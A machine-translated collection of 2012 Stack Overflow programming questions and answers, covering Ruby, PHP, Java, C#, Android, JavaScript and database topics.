```

实现的代码（仅用于演示，不用于生产）

```
class ArrayWithHashElements
  def initialize some_array
    @elements = some_array
  end
  def search( query_hash)
    puts "search:  #{query_hash.inspect}"
    result = []
    @elements.each do | array_element_in_hash_form|
      query_hash.each_pair do | key, value |
        if array_element_in_hash_form.has_key?(key) && array_element_in_hash_form[key] == value
          puts "adding : #{array_element_in_hash_form.inspect} to result"
          result << array_element_in_hash_form
        end
      end
      result
    end
    return result.size != 1 ? result : result[0]
  end
end 
```

结果：

```
sg552@siwei-moto:~/workspace/test$ ruby search_hash_test.rb
Loaded suite search_hash_test
Started
search:  {"a"=>1}
adding : {"b"=>2, "a"=>1} to result
adding : {"b"=>4, "a"=>1} to result
.search:  {"a"=>3}
adding : {"b"=>4, "a"=>3} to result
.
Finished in 0.000513 seconds.

2 tests, 2 assertions, 0 failures, 0 errors 
```

# php - 如何使用 PHP 从 get 请求中获取本地存储的 XML

> ID：10991650
> 
> 赞同：-1
> 
> 时间：2012-06-12T06:42:49.833
> 
> 标签：php, xml, get

我是 PHP 新手。我需要通过 GET 请求使用 PHP 获取本地存储的 xml

我试过这个

```
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    echo "POST Request";
} else if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    echo "GET Request";
} 
```

所以现在我知道在 POST/GET 中遇到了什么。

下一步要做什么才能获得 XML？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:56:46.273

使用该[`header`](http://php.net/header)函数为您正在使用的 XML 输出正确的内容类型，然后[`readfile`](http://php.net/readfile).

或者只是用于`header`输出`Location`标头并让您的网络服务器处理提供 XML。

# algorithm - 在 Floyd 循环查找算法中跳过多个节点

> ID：10991654
> 
> 赞同：1
> 
> 时间：2012-06-12T06:42:54.823
> 
> 标签：algorithm, data-structures, floyd-cycle-finding

今天我正在阅读 Floyd 的在链表中检测循环的算法。我只是想知道如果我们跳过多个节点（比如 2 个）以更快地进行循环检测会不会更好？

例如：

```
fastptr=fastptr->next->next->next. 
```

请注意，更改时会考虑副作用`fastptr`。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-12T07:07:50.043

您的建议仍然是正确的，但它不会改变算法的速度。如果您查看[wiki](http://en.wikipedia.org/wiki/Cycle_detection#Tortoise_and_hare)中的龟兔算法：

> 该算法的关键在于，对于任何整数 i ≥ μ 和 k ≥ 0，x [i] = x [i + kλ]，其中 λ 是要找到的循环的长度，μ 是循环的开始位置。特别是，只要 i = kλ ≥ μ，则**x [i] = x [2i]**。

在粗体部分，您也可以说**x [i] = x [3i]**或任何其他系数，但关键的见解是找到**i**，您会找到多少次跳跃并不重要，算法的顺序取决于**我**。

# domain-driven-design - 影响域设计的 UI 问题

> ID：10991656
> 
> 赞同：0
> 
> 时间：2012-06-12T06:43:05.437
> 
> 标签：domain-driven-design

我有一个相当简单的域，确定了大约 7-8 个主要实体，这些可能是它们自己的聚合根。但是会有一个 UI 屏幕列出系统中所有对象的联合，这意味着所有聚合的联合。

我想到的一种方法是使用组合，即所有其他聚合根引用的元数据聚合，这将是一个独立的实体。所以对于这个屏幕，我可以查询这个聚合，我移动到这个新聚合的字段是需要在我的“所有对象”网格中显示的公共字段。

另一种方法可能是使用应用程序服务方法，通过查询其他存储库并在应用程序层合并列表并处理分页等，为“所有对象”屏幕构建必要的列表。

我对第一个解决方案感到不安，因为我可以看到一个 UI 用例影响了我的域设计，但是 db 完成了处理分页、合并列表等繁重的工作，并且没有连接所有这些信息是由一个简单的查询收集的.

第二种解决方案虽然看起来更整洁，但在易用性和性能方面有所下降。

请指教。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T19:12:39.033

在这种情况下，我建议使用[读取模型](http://gorodinski.com/blog/2012/04/25/read-models-as-a-tactical-pattern-in-domain-driven-design-ddd/)，它们本质上是专门用于读取场景的值对象或 DTO。使用读取模型是保持实体和 AR 清洁的一种模式。至于如何创建读取模型，您基本上有两个选项，如您所描述的。一种是让一个存储库返回一个满足给定视图要求的读取模型。这将允许您利用数据库来提高性能。另一种选择是在应用程序服务级别或表示层的事件中组合来自多个存储库或服务的读取模型。这种方法更具可扩展性，因为数据不必来自同一个数据源。

# java - jar 并且找不到方法的符号（但找到了其他类方法）？

> ID：10991657
> 
> 赞同：1
> 
> 时间：2012-06-12T06:43:16.607
> 
> 标签：java, ant, jar

我真的有这个问题。

所以我有一个 jar 和一个用于处理数据库连接的类。在那个课程中，我提出了几种方法。在这个类中，我使用 Ant 创建了一个 jar。

昨天某个时候，我突然无法再访问该数据库类中的最新方法。我得到：

```
compile:
[javac] C:\cygwin\home\user\Dev\Java\avc_alarm\build.xml:22: warning: 'includeantruntime' was not set, defaulting to build.sysclasspath=last; set to false for repeatable builds
[javac] Compiling 1 source file to C:\cygwin\home\user\Dev\Java\avc_alarm\build
[javac] C:\cygwin\home\user\Dev\Java\avc_alarm\src\se\gefa\avc_alarm\Main.java:9: error: cannot find symbol
[javac] symbolAliases = db.getAlarmSymbolAlias();
[javac]                   ^
[javac]   symbol:   method getAlarmSymbolAlias()
[javac]   location: variable db of type AvcDb
[javac] 1 error 
```

尝试使用此类方法的代码：

```
package se.gefa.avc_alarm;

import se.gefa.avc_db.AvcDb;
import java.util.ArrayList;

public class Main {
    static AvcDb db  = new AvcDb();
    static ArrayList<String> symbolAliases;

    public static void main(String args[]) throws Exception {
        db.setupConnection("jdbc:h2:tcp://localhost/C:/XXXX/xyz", "sa", "");
        symbolAliases = db.getAlarmSymbolAlias();
    }
} 
```

和 db 类（进入一个罐子）：

```
package se.gefa.avc_db;

import java.sql.*;
import java.util.ArrayList;

public class AvcDb {

    // ---
    // Other methods that DO work
    // ---

    // The one that DO NOT work
    public ArrayList<String> getAlarmSymbolAlias() throws Exception {
        String query = "SELECT * FROM Alarm";
        Statement statement = conn.createStatement();
        ResultSet resultSet = statement.executeQuery(query);

        ArrayList<String> symbols = new ArrayList<String>();
        while (resultSet.next())
            symbols.add(resultSet.getString("symbol_alias"));

        return symbols;
    }
} 
```

我正在使用 java 7、Ant 1.8.3 和 Vim。在 IntelliJ 中打开 db jar 时，我可以看到 getAlarmSymbolAlias 方法存在。正如我所说，我可以调用 db 类的任何其他方法，除了昨天添加的任何方法。IntelliJ 中的一个简单测试，它似乎可以工作（但是当我在 Vim、CL 和 Ant 中进行所有其他设置时，我不想学习新的编辑器。

**编辑**Ant 脚本：

```
<project name="AvcAlarm" default="dist" basedir=".">
  <description>
    Alarm program. 
  </description>

  <property name="src" location="src"/>
  <property name="build" location="build"/>
  <property name="dist" location="dist"/>
  <property name="lib" location="lib"/>

  <path id="classpath">
    <fileset dir="${lib}" includes="**/*.jar"/>
  </path>

  <target name="init">
    <tstamp/>
    <mkdir dir="${build}"/>
    <mkdir dir="${dist}"/>
  </target>

  <target name="compile" depends="init" description="compile the source " >
    <javac srcdir="${src}" destdir="${build}" classpathref="classpath"/>
  </target>

  <target name="dist" depends="compile" description="generate the distribution" >
    <jar destfile="${dist}/gefa_alarm.jar" basedir="${build}">
        <zipgroupfileset dir="lib" includes="*.jar" />
        <manifest>
            <attribute name="Main-Class" value="se/gefa/avc_alarm/Main"/>
        </manifest>
    </jar>
  </target>

  <target name="clean" description="clean up" >
    <delete dir="${build}"/>
    <delete dir="${dist}"/>
  </target>
</project> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:48:13.713

您的类路径一定是错误的，或者您使用了不包含此方法的无效 JAR 版本。

**使用 OP 调查后更新**：文件夹中的另一个 JAR`lib`包含不同版本的 AvcDb，并且首先在类路径上加载，因此找不到所需的方法。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T07:36:18.803

由于您已验证您的 JAR 包含新添加的方法，因此类路径中应该存在问题，并且加载了该类的其他一些旧版本。更改类路径的顺序，以便将此 jar 文件设置在顶部。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T06:54:39.167

我怀疑当您编译 AvcDb.java 时，您的 JAR 文件不在您的类路径中，或者您的类路径中有旧版本的您的 JAR，但方法签名不同。

您还应该删除所有旧的 *.class 文件，这些文件可能是从以前的构建中创建的。您的 ANT build.xml 中是否有一个“准备”目标，可以在再次编译之前删除所有旧的构建工件？

# c# - C#：如何使用枚举关键字？

> ID：10991659
> 
> 赞同：-2
> 
> 时间：2012-06-12T06:43:21.143
> 
> 标签：c#, enums

我有以下代码，问题是当我尝试将国家/地区分配给客户时，出现错误。我需要知道如何分配声明为枚举的属性？我将在 linq 表达式中使用它，还有其他使用枚举的方法吗？

```
var customers = new Customer[] {
    new Customer { Name= "Badhon",City=   "Dhaka",Country=Countries.Country.Bangladesh,Order= new Orders[] {
        new Orders { OrderID=1,ProductID=1,Quantity=2,Shipped=false,Month="Jan"}}},
    new Customer {Name = "Tasnuva",City = "Mirpur",Country =Countries .Country .Italy,Order =new Orders[] {
        new Orders { OrderID=2,ProductID=2,Quantity=5,Shipped=false,Month="Feb"}}}
} 
```

我`enum`的定义如下：

```
public class  Countries
{
    public enum Country  {Italy,Japan,Bangladesh};

} 
```

`Customer`如下：

```
public class Customer
{
    public string Name;
    public string City;
    public Countries Country;
    public Orders[] Order;

    public override string  ToString()
    {
        return string.Format("Name: {0} - City: {1} - Country: {2}", this.Name, this.City, this.Country);
    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T06:00:06.927

您的问题是您在 Customer 中的字段是 type `Countries`，而不是`Countries.Country`。而且您正在尝试分配一个`Countries.Country`显然不兼容的。

枚举是一种*类型*，就像类一样。你不需要围绕它的类。你应该摆脱那里的外部类：

```
public enum Country { Italy,Japan,Bangladesh } 
```

并重新定义中的字段`Customer`：

```
public Country Country; 
```

（是的，在 C# 中具有与类型同名的类成员）。

另一个问题：您可能应该使用属性而不是字段：

```
public Country Country { get; set; } 
```

这将使您的生活更轻松（并且您可以像现在一样使用它，直到您阅读了差异）。

# asp.net - 如何将 Session 传递给 DataTable？

> ID：10991664
> 
> 赞同：0
> 
> 时间：2012-06-12T06:44:19.677
> 
> 标签：asp.net, sql

在我的 asp 项目中，我需要使用 TVP 将列表框中的所有项目写入数据库表。我有列表框、存储过程（通过 TVP - 表值参数）。主要问题是传递 DataTable 是 NULL，但 Session 不是。我会将我的代码表单 aspx.cs 文件发送给您（只有一个块，如果您需要更多，请告诉我）。

```
protected void ASPxButton1_Click(object sender, EventArgs e)
{
    //DataTable dts = Session["SelectedOptions"] as DataTable;

    DataTable _dt;
    //_dt = new DataTable("Items");
    _dt = Session["SelectedOptions"] as DataTable;
    _dt.Columns.Add("Id", typeof(int));
    _dt.Columns.Add("Name", typeof(string));

    foreach (ListEditItem item in lbSelectedOptions.Items)
    {
        DataRow dr = _dt.NewRow();
        dr["Id"] = item.Value;
        dr["Name"] = item.Text;
    }
    SqlConnection con;
    string conStr = ConfigurationManager.ConnectionStrings["TestConnectionString2"].ConnectionString;
    con = new SqlConnection(conStr);
    con.Open();

    using (con)
    {
        SqlCommand sqlCmd = new SqlCommand("TestTVP", con);
        sqlCmd.CommandType = CommandType.StoredProcedure;
        SqlParameter tvpParam = sqlCmd.Parameters.AddWithValue("@testtvp", _dt);
        tvpParam.SqlDbType = SqlDbType.Structured;
        sqlCmd.ExecuteNonQuery();
    }
    con.Close();

} 
```

**编辑**

[调试截图](http://i.stack.imgur.com/Ivv1U.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:28:04.280

您没有将新行添加到 DataTable。你需要这样的东西：

```
foreach (ListEditItem item in lbSelectedOptions.Items)
{
    DataRow dr = _dt.NewRow();
    dr["Id"] = item.Value;
    dr["Name"] = item.Text;

    _dt.Rows.Add(dr);
} 
```

第二个问题是你在哪里初始化`Session["SelectedOptions"]`？似乎每次单击 ASPxButton1 时，代码都会尝试向其中添加 Id 和 Name 列，即使它已经包含这两列。这样做似乎更合乎逻辑：

```
_dt = Session["SelectedOptions"] as DataTable;
if (_dt == null)
{
    _dt = new DataTable("Items");
    _dt.Columns.Add("Id", typeof(int));
    _dt.Columns.Add("Name", typeof(string));
    Session.Add("SelectedOptions", _dt);
} 
```

# iphone - UITableCell 重用自身

> ID：10991665
> 
> 赞同：0
> 
> 时间：2012-06-12T06:44:23.687
> 
> 标签：iphone, ios, uitableview

我做了一个`UITableViewCell`，我在那个表中有 20 行，屏幕上一次有 5 行。我在选择行的 didSelect 委托方法中设置了辅助视图复选标记。我担心的是假设选择了第一行并检查了它的附件类型，现在如果我滚动表格，我们会看到第六行也被选中。我知道细胞正在重用自己，而不是再次创造自己。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:47:31.053

该模型应该能够处理检查哪个单元格，哪个没有。为了简化问题，您可以保留一个数组，该数组将`NSIndexPath`检查应检查的 s。如果当时只能检查一个，那么一个类型的 ivar 就`NSIndexPath`绰绰有余了。

* * *

```
- (void)tableView:(UITableView *)aTableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath
{
    if ([[aTableView cellForRowAtIndexPath:indexPath] accessoryType] == UITableViewCellAccessoryCheckmark)
    {
            // Ok this one is selected, so we will remove it from the Reference Array.

    }
    else
    {
        // Ok this one doesn't has a checkMark
        // First add the checkmark
        [[aTableView cellForRowAtIndexPath:indexPath] setAccessoryType:UITableViewCellAccessoryCheckmark];

        // Add the NSIndexPath to the Array of references
    }
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-12T06:48:23.910

在委托方法中

```
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{
    NSString *cellId = [NSString stringWithFormat:@"cell%d",indexPath.row];
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:cellId ];
    if (cell==nil) {
        cell = [[[UITableViewCell alloc] initWithStyle:UITableViewCellStyleValue1
                                       reuseIdentifier:cellId ] autorelease];
    }
} 
```

将不同的单元格 ID 设置为不同的单元格行。

# php - 从特定服务器到另一台特定服务器的PHP CURL不起作用

> ID：10991668
> 
> 赞同：1
> 
> 时间：2012-06-12T06:44:29.990
> 
> 标签：php, curl

我有两台服务器 s1 和 s2。我有一个来自 s1 的文件，试图通过 php curl 访问来自 s2 的文件。curl 命令是在 s1/test.php 中使用 php 编写的，它正在请求 s2/file.php。

我测试了 curl 是否存在于 s1 中，并且除了 s2 之外的所有 url 都可以正常工作。我也可以从 localhost 访问 s2，但不能从 s1 访问。请帮我。

这是我的卷曲代码：

```
$ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, "here the url is placed");
            curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            $data = curl_exec($ch);
if(!$data)
{
    echo 'Curl error: ' . curl_error($ch);
}
            curl_close($ch);
            echo $data; 
```

当我执行时，我得到：“Curl 错误：无法连接到主机”

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T06:47:01.980

`couldn't connect to host`表示两台服务器之间的连接有问题。检查 DNS、ip 的防火墙、打开的端口和服务...

`wget`从 s1 到 s2 在 CLI中运行说明了什么？

# c# - 我想从另一个子表单事件中关闭一个子表单？

> ID：10991669
> 
> 赞同：0
> 
> 时间：2012-06-12T06:44:32.227
> 
> 标签：c#, forms, mdi, mdichild

我有一个弹出来显示数据的孩子。

但是当数据发生变化时，会创建一个新表单来显示新数据。

我想关闭旧表单，所以每次数据更改时我都不会得到 5000 个表单。

创建新表单的原因是可以在其名称中显示数据的 ID。

**我的代码：**

```
String Pass; // used to get value from class and pass it to next form.

public void ShowNewCompareDiff() //object sender, EventArgs e
{
    FormCompareDiff childForm = new FormCompareDiff(Pass);
    childForm.MdiParent = MdiParent;
    childForm.Text = "Comepare difference ";

    //childForm.Close(); //Not working 
    //childForm = null; //Not working

    childForm.Show();
}

private void dataGridViewResult_CellMouseClick(object sender, DataGridViewCellMouseEventArgs e)
{
    CompareXML Com = new CompareXML();
    Pass = Com.Compare(richTextBoxSQL.Text, richTextBoxPrevSQL.Text);
    ShowNewCompareDiff();
} 
```

**子窗体 FormCompareDiff：**

```
namespace AuditIT_1
{
    public partial class FormCompareDiff : Form
    {
        String Passed;
        public FormCompareDiff(String Pass)
        {
            Passed = Pass;
            this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
            this.Location = new System.Drawing.Point(836, 0); // Form Shows next to FormSchemaSearch
            InitializeComponent();
        }
        private void FormCompareDiff_Load(object sender, EventArgs e)
        {
            String Pass = Passed;
            CompareXML Com = new CompareXML();
            webBrowserDifferences.DocumentText = Com.ResultShow(Pass);
        }       
    }    
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-12T06:48:10.837

您可以转换`childForm`为您的类的成员变量，然后将您的`ShowNewCompareDiff`方法更改为以下内容：

```
FormCompareDiff childForm;

public void ShowNewCompareDiff()
{
    if (childForm != null)
        childForm.Dispose(); // Get rid of old form, if exists

    childForm = new FormCompareDiff(Pass);
    childForm.MdiParent = MdiParent;
    ...
} 
```

**编辑：**

完整示例

创建一个新的`WindowsFormApplication`，添加一个新`Button`的`Form`，添加以下代码：

```
public partial class Form1 : Form
{
    Form MyForm;

    public Form1()
    {
        InitializeComponent();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        if (MyForm != null)
            MyForm.Dispose();

        MyForm = new Form() { Text = DateTime.Now.ToString() };
        MyForm.Show();
    }
} 
```

测试一下。你会看到它是如何工作的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-12T07:10:55.977

您需要明确跟踪子表单的生命周期。并使用属性而不是构造函数参数，这样您就可以更新孩子而不必创建新的。像这样：

```
FormCompareDiff childForm;

public void ShowNewCompareDiff()
{
    if (childForm != null) {
        childForm.WindowState = FormWindowState.Normal;
    }
    else {
        childForm = new FormCompareDiff();
        childForm.MdiParent = MdiParent;
        childForm.FormClosed += delegate { childForm = null; };
    }
    childForm.Pass = Pass;
    childForm.Show();
} 
```

不要忘记将公共 Pass 属性添加到 FormCompareDiff。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-12T06:52:59.490

在您的 ShowNewCompareDiff() 方法上，您创建 FormCompareDiff 表单对象将其作为主表单上的属性，然后您可以在每次数据更改时更新同一表单的文本，如果该属性的子属性为空，则创建新的并分配回它。

## 编辑

```
public void ShowNewCompareDiff(Form formToClose) 
{
    FormCompareDiff childForm = new FormCompareDiff(Pass);
    childForm.MdiParent = MdiParent;
    childForm.Text = "Comepare difference ";
    childForm.Show();
    formToClose.Close(); // close the form you want
} 
```

将此方法称为

```
ShowNewCompareDiff(this); 
```

# android - Android ListView: Can not center items on start up, due to Null Pointer Exception

> ID：10991675
> 
> 赞同：4
> 
> 时间：2012-06-12T06:44:59.760
> 
> 标签：android, android-listview

This is my first ever post here and I'm a dumb novice, so I hope someone out there can both help me and excuse my ignorance.

I have a ListView which is populated with an ArrayAdapter. When I either scroll or click, I want the selected item, or the item nearest the vertical center, to be forced to the exact vertical center of the screen. If I call listView.setSelection(int position) it aligns the selected position at the top of the screen, so I need to use listView.setSelectionFromTop(position, offset) instead. To find my offset, I take half of the View's height from the half of the ListView's height.

So, I can vertically center my item easy enough, within OnItemClick or OnScrollStateChanged, with the following:

```
 int x = listView.getHeight();
        int y = listView.getChildAt(0).getHeight();                 
        listView.setSelectionFromTop(myPosition, x/2 - y/2); 
```

All this works fine. My problem is with the initial ListView setup. I want an item to be centered when the activity starts, but I can't because I get a NullPointerException from:

```
int y = listView.getChildAt(0).getHeight(); 
```

I understand this is because the ListView has not yet rendered, so it has no children, when I call this from OnCreate() or OnResume().

So my question is simply: how can I force my ListView to render at startup so I can get the height value I need? Or, alternatively, is there any other way to center items vertically within a ListView?

Thanks in advance for any help!

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T06:59:13.590

```
int y = listView.getChildAt(0).getHeight(); 
```

I understand this is because the ListView has not yet rendered, so it has no children, when I call this from `onCreate()` or `onResume()`.

You should call it in `onScroll`.

```
listView.setOnScrollListener(new OnScrollListener() {

    @Override
    public void onScrollStateChanged(AbsListView view, int scrollState) {

    }

    @Override
    public void onScroll(AbsListView view, int firstVisibleItem,
        int visibleItemCount, int totalItemCount) {
         //Write your logic here

         int y = listView.getChildAt(0).getHeight();

    }       
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-12T08:06:29.073

I'm answering my own question here, but it's very much a hack. I think it's interesting because it sheds some light on the behavior of listviews.

The problem was in trying to act on data (a listview row) that did not yet exist (it had not been rendered). listview.getChildAt(int) was null because the listview had no children yet. I found out onScroll() is called immediately when the activity is created, so I simply put everything in a thread and delayed the getChildAt() call. I then enclosed the whole thing in a boolean wrapper to make sure it is only ever called once (on startup).

The interesting thing was that I only had to delay the call by 1ms for everything to be OK. And that's too fast for the eye to see.

Like I said, this is all a hack so I'm sure all this is a bad idea. Thanks for any help!

```
private boolean listViewReady = false;

public void onScroll(AbsListView view, int firstVisibleItem,
        int visibleItemCount, int totalItemCount) {

    if (!listViewReady){
        Thread timer = new Thread() {
            public void run() {
                try{
                    sleep(1);
                }catch (InterruptedException e) {
                    e.printStackTrace();
                }finally{                   
                    runOnUiThread(new Runnable() {
                         public void run() {
                             myPosition = 2;
                             int x = listView.getHeight();
                             int y = listView.getChildAt(0).getHeight();                 
                             listView.setSelectionFromTop(myPosition, x/2 - y/2);
                             listViewReady = true;
                        }
                    });                     
                }
            }
        };
        timer.start();
    }//if !ListViewReady 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-13T14:09:14.257

I have achieved the same using a in my opinion slighlty simpler solution

```
mListView.post(new Runnable() {
   @Override
   public void run() {
      int height = mListView.getHeight();
      int itemHeight = mListView.getChildAt(0).getHeight();
      if (positionOfMyItem == myCollection.size() - 1) {
        // last element - > don't subtract item height
        itemHeight = 0;
    }
    mListView.setSelectionFromTop(position, height / 2 - itemHeight / 2);
   }
}); 
```

# extjs4 - 如何获取商店的 TotalPage？

> ID：10991679
> 
> 赞同：1
> 
> 时间：2012-06-12T06:45:25.247
> 
> 标签：extjs4

在我的程序中，我正在使用网格分页。在特定情况下，我需要 totalPage

一家商店的数量。有什么方法可以得到它？

请帮我....

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-12T07:23:33.503

您的服务器应该发回记录总数，如下所示：

```
{
 success:true,
 total:999,
 records:[
  {
   id:1,
   name:'Arundev PV'
  }
 ]
} 
```

那么您可以使用 store.getTotalCount() 来获取该值。

[http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Store-method-getTotalCount](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.Store-method-getTotalCount)

您可以使用自定义“总计”属性的名称

[http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.reader.Reader-cfg-totalProperty](http://docs.sencha.com/ext-js/4-1/#!/api/Ext.data.reader.Reader-cfg-totalProperty)

# error-handling - Ninject ToFactory 不使用参数

> ID：10991683
> 
> 赞同：0
> 
> 时间：2012-06-12T06:45:45.840
> 
> 标签：error-handling, ninject, factory

我正在尝试为 Ninject 使用 ToFactory 扩展，但遇到了一些问题。

如果我有这样的构造函数：

```
public ListenerReader(IDepen1 depen1, IDepen2 depen2, UdpClient client, DataReceiveModes dataReceiveMode, int receivePort)
{
} 
```

然后我创建一个工厂来自动创建这样的项目：

```
 public interface IListenerReaderFactory
  {
    ListenerReader CreateListenerReader(UdpClient client, DataReceiveModes dataReceiveMode, int receivePort);
  } 
```

当我尝试调用注入的工厂时收到激活错误：
错误激活 int 没有可用的匹配绑定，并且类型不是自绑定的。

Ninject 似乎不喜欢在工厂中注入原始类型。我也看到了同样的错误，但字符串类型在另一个工厂？

如果这不起作用，我是否必须将参数分离到一个被调用的方法中？

**编辑：**

似乎有问题的类型是在工厂外注入的。因此，Ninject 试图为失败的 enum 和 int 类型创建绑定。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-12T17:39:14.687

问题是没有调用工厂，而是直接注入了类型。

# listbox - 更新“简单”列表框 ZK

> ID：10991686
> 
> 赞同：1
> 
> 时间：2012-06-12T06:45:51.107
> 
> 标签：listbox, zk

单击提交按钮时，我想更新列表框。列表框最初由 JSONObject 列表组成，单击提交按钮后，列表元素发生更改，列表框应随更改而更新，但我不能这样做。你能帮我更新列表框吗？

这就是我将 JSONObject 列表放入列表框中的方式

```
<listbox id="userListbox">
<listhead>
    <listheader label="Id"></listheader>
    <listheader label="Name"></listheader>
    <listheader label="Address"></listheader>
    <listheader label="Phone"></listheader>
</listhead>
<listitem forEach="${userController.list}">
    <listcell label="${each.id}" ></listcell>
    <listcell label="${each.name}" ></listcell>
    <listcell label="${each.address}" ></listcell>
    <listcell label="${each.phone}" ></listcell>
</listitem> 
```

在用户控制器类中：

```
private List<JSONObject> list;

@Listen("onClick = #submitButton")
public void onSubmit(Event event) {
    loadUser();
}

private void loadUser() {
    JSONObject input = new JSONObject();
    input.put("name", nameBox.getText());

    list = getUserList(input);
}

public List<JSONObject> getList() {
    return list;
}

public void setList(List<JSONObject> list) {
    this.list = list;
} 
```

而且我不知道如何更新列表框？感谢您的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:21:53.317

在用户控制器类中：

```
private List<JSONObject> list;
Listbox userListbox;
@Listen("onClick = #submitButton")
public void onSubmit(Event event) {
    loadUser();
}

private void loadUser() {
    JSONObject input = new JSONObject();
    input.put("name", nameBox.getText());

    list = getUserList(input);
    userListbox.setModel(list);
    userListbox.set//Your own item renderer
}

public List<JSONObject> getList() {
    return list;
}

public void setList(List<JSONObject> list) {
    this.list = list;
} 
```

而且我不知道如何更新列表框？感谢您的帮助。

# javascript - 查询字符串发送值 = 0，不是 jQuery 中的新赋值

> ID：10991690
> 
> 赞同：2
> 
> 时间：2012-06-12T06:46:17.683
> 
> 标签：javascript, jquery, initialization, jquery-events

**在 Js 中**

```
$(document).ready(function() {
var trxID=0;
var oHoldTable=$('#posHold').dataTable();
$('#posHold tbody tr').die();
$('#posHold tbody tr').live('dblclick', function () {
    var oHData = oHoldTable.fnGetData( this );
    trxID=oHData[0];
    if (oHData[0] > 0) {
        $.post("VoidTransaction",{
            trxID:oHData[0]
        },function(data){
            if (data.rst==1) {
                parent.tb_remove();
                $('.btnPrint').trigger('click');
            }
        });
    }else{
        alert("No Transaction is Available for Void");
    }
});

$(".btnPrint").printPage({
 url: "receipts/void.jsp?trxID="+trxID,
    attr: "href",
    message:"Your document is being created"
})
}); 
```

我已经声明了一个变量 trxID 并用 0 初始化。然后在 .live even 处理程序中分配一个值，例如：

```
 trxID=oHData[0]; 
```

但查询字符串仍然发送值 = 0，而不是新分配的值。

```
url: "receipts/void.jsp?trxID="+trxID 
```

如何获取 trxID 的更新值？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-12T07:00:00.297

我做了一点改动，希望它能正常工作，我认为不需要解释。你可以轻松猜到！

```
$(document).ready(function() {

var trxID=0;

var oHoldTable=$('#posHold').dataTable();
$('#posHold tbody tr').off();
$('#posHold tbody tr').on('dblclick', function () {
    var oHData = oHoldTable.fnGetData( this );
    trxID=oHData[0];
    if (oHData[0] > 0) {
        $.post("VoidTransaction",{
            trxID:oHData[0]
        },function(data){
            if (data.rst==1) {
                parent.tb_remove();
                $('.btnPrint').trigger('click');
            }
        });
    }else{
        alert("No Transaction is Available for Void");
    }

    $(".btnPrint").printPage({

        url: "receipts/void.jsp?trxID="+trxID,
        attr: "href",
        message:"Your document is being created"
    })

});

}); 
```

# mysql - MySQL vs SQL Server 2008 R2 简单选择查询性能

> ID：10991693
> 
> 赞同：6
> 
> 时间：2012-06-12T06:46:47.463
> 
> 标签：mysql, sql-server, performance, sql-server-2008

谁能向我解释为什么 MySQL 和 SQL Server 对于这个简单的 select 语句在性能上有显着差异？

```
SELECT email from Users WHERE id=1 
```

目前数据库只有一张表，有 3 个用户。MySQL 时间平均为 0.0003，而 SQL Server 为 0.05。这是正常的还是 MSSQL 服务器配置不正确？

**编辑：**
两个表具有相同的结构，主键设置为`id`，MySQL 引擎类型为 InnoDB。
我尝试了查询，`WITH(NOLOCK)`但结果是一样的。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T16:58:43.750

服务器是同级别的吗？硬件也有所作为。同时访问数据库的人数是否大致相同？是否有任何其他应用程序使用相同的硬件（数据库通常不应与其他应用程序共享服务器）。

就我个人而言，我不会担心这种差异。如果您想查看哪个性能更好，则将数百万条记录添加到数据库中，然后测试查询。一般来说，数据库在小型表上的简单查询都表现良好，即使是设计不良或设置不正确的表。要知道您是否会遇到性能问题，您需要在类似于 prod 的硬件上使用大量数据和许多同时用户进行测试。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T15:37:50.073

诊断低成本查询的问题是固定成本可能会超过可变成本。并不是说我是 MS-Fanboy，而是我更熟悉 MS-SQL，所以我将主要解决这个问题。

MS-SQL 可能有更多的优化和查询解析开销，这在决定是否使用索引、查看统计信息等时会增加查询的固定成本。MS-SQL 还会记录很多关于查询计划的内容。执行并存储大量数据以供将来优化，这会增加开销

当查询需要很长时间时，这一切都会有所帮助，但是在对单个查询进行基准测试时，似乎显示出较慢的结果。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T17:14:00.193

有几个因素可能会影响该基准，但最重要的可能是[MySQL 缓存查询](http://dev.mysql.com/doc/refman/5.1/en/query-cache.html)的方式。

当您运行查询时，MySQL 将缓存查询的文本*和结果*。当再次发出相同的查询时，它只会从缓存中返回结果，而不是实际运行查询。

